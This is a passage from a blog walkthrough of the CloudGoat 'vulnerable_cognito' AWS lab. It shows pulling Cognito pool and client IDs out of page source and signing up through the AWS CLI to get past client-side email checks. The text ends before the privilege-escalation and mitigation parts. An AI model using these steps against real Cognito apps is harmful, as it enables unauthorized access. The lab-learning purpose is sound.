# CloudGoat Scenario 2: vulnerable_cognito (Small / Moderate): WalkThrough and Mitigation

Hey hi, Soumyanil is back but with Cloud now, let’s have a look into AWS Penetration Testing. I will be covering all the scenarios provided by the CloudGoat vulnerable AWS environment by Rhinosecurity Labs.

**CloudGoat** is **Rhino Security Labs**’ “_Vulnerable by Design_” AWS deployment tool. It allows us to hone our cloud cybersecurity skills by creating and completing several **CTF** style scenarios. Each and every scenario is composed of AWS resources arranged together to create a structured learning experience. These scenarios vary in difficulty and many offer multiple paths to Flag/Goal.

From ***Purple Team point of View***:\
i. Our mission to perform Recon, identify vulnerabilities, and perform exploitation in order to achieve the scenario objective.\
ii. Provide Mitigation for the above Flaw that we came accross.

### <ins>Details about the Scenario :</ins>
i. In this scenario, you are presented with a signup and login page with AWS Cognito in the backend.\
ii. You need to :\
&nbsp;&nbsp;Objective A. ***Bypass restrictions*** \
&nbsp;&nbsp;Objective B. and ***Exploit Misconfigurations in Amazon Cognito*** in order :\
&nbsp;&nbsp;&nbsp;&nbsp;1. ***To Elevate your privileges***\
&nbsp;&nbsp;&nbsp;&nbsp;2. ***and get Cognito Identity Pool credentials***

I will be using Kali Linux VM to Spin Up the Vulnerable Lab Setup.

### CloudGoat SetUp:

To install [CloudGoat](https://github.com/RhinoSecurityLabs/cloudgoat/):
```bash
git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
cd cloudgoat
pip3 install -r ./requirements.txt
chmod +x cloudgoat.py
```
### NOTE:
Please setup the AWS CLI and AWS account prior to the above commands and create a user with name “cloudgoat” having permission for CLI connections.

### 1. Setting Up Scenario 2: vulnerable_cognito (Small / Moderate):
```bash
./cloudgoat.py create vulnerable_cognito
```
![](https://github.com/reveng007/reveng007.github.io/blob/main/CloudGoat/2.Scenarios-vulnerable_cognito%20(Small%20or%20Moderate)/1.ScenarioSetUp.png?raw=true)

![](https://github.com/reveng007/reveng007.github.io/blob/main/CloudGoat/2.Scenarios-vulnerable_cognito%20(Small%20or%20Moderate)/2.ScenarioSetUp.png?raw=true)



Q. BTW, What is **Amazon Cognito** ? \
Ans: According to [AWS](https://docs.aws.amazon.com/cognito/latest/developerguide/what-is-amazon-cognito.html):

![](https://github.com/reveng007/reveng007.github.io/blob/main/CloudGoat/2.Scenarios-vulnerable_cognito%20(Small%20or%20Moderate)/3.AmazonCognito.png?raw=true)

> So basically, **Amazon Cognito** is a User Identity and Data Syncronization Service, which gives User a very easy time to manage their accounts connected Over Mutiple Electronic Devices. 

### Let's Start:

```bash
┌──(kali㉿kali)-[~/AWS/BLOG_AWS/cloudgoat]
└─$ cat vulnerable_cognito_cgidgxpcecu5yc/start.txt 

apigateway_url = https://ht0ueqmd17.execute-api.us-east-1.amazonaws.com/vulncognito/cognitoctf-vulnerablecognitocgid2jkmefusdh/index.html
cloudgoat_output_aws_account_id = 572769290600
```

Let's Navigate to the site and signing up:

![image](https://github.com/reveng007/blog/assets/61424547/9a63d938-79fc-42fa-a4f1-05ac6cef5642)

Now using [temp-mail](https://temp-mail.org/en/), I tried to Sign-Up but I failed!

![](https://github.com/reveng007/reveng007.github.io/blob/main/CloudGoat/2.Scenarios-vulnerable_cognito%20(Small%20or%20Moderate)/5.SignUpEmailValidationError.png?raw=true)

### ***Objective A: Bypassing email (client-side validation Check) restrictions***:

#### 1. Inspecting Source code of Webpage:

![image](https://github.com/reveng007/blog/assets/61424547/eb805432-0ac9-4897-8d2e-1aea2eb17721)

Got this Creds:
```bash
UserPoolId: 'us-east-1_mYaVxhwr7'
ClientId: '4u4i11pmknfa2k6flrur6c3a5v'
```

#### 2. Bypassing email Client-Side validation Checks/ restrictions via AWS CLI:

Let us use this _retireved_ `ClientId` to SignUp Via AWS CLI, which would bypass _`email Client-Side validation Check/restriction`_.

```bash
aws cognito-idp sign-up --client-id [Client-id] --username [temp-mail address] --password [add-password] --region [region] --user-attributes '[{"Name":"given_name","Value":"lorem"},{"Name":"family_name","Value":"ipsum"}]'
```

```bash
┌──(kali㉿kali)-[~/AWS/BLOG_AWS/cloudgoat]
└─$ aws cognito-idp sign-up --client-id 4u4i11pmknfa2k6flrur6c3a5v --username yeripan911@bitofee.com --password Passw0rd! --region us-east-1 --user-attributes '[{"Name":"given_name","Value":"lorem"},{"Name":"family_name","Value":"ipsum"}]'
{
    "UserConfirmed": false,
    "CodeDeliveryDetails": {
        "Destination": "y***@b***",
        "DeliveryMedium": "EMAIL",
        "AttributeName": "email"
    },
    "UserSub": "3072f385-94fb-4eff-8371-829f7610af7e"
}
```
